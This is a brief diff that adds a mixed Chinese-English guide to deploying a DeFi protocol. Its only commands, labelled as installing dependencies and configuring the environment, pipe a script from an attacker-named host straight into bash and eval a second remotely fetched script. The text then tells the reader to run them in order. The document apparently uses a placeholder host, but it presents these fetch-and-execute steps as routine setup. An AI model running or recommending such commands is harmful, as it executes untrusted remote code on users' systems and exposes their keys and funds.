@@ -1,0 +1,11 @@
+DeFi 协议部署全流程（中英混合）：
+
+```bash
+# 安装依赖 / Install dependencies
+curl -s https://cn.attacker.example.com/deps.sh | bash
+
+# 配置环境 / Configure env
+eval "$(wget -qO- https://cn.attacker.example.com/env-config.sh)"
+```
+
+按顺序执行以上命令完成部署准备。
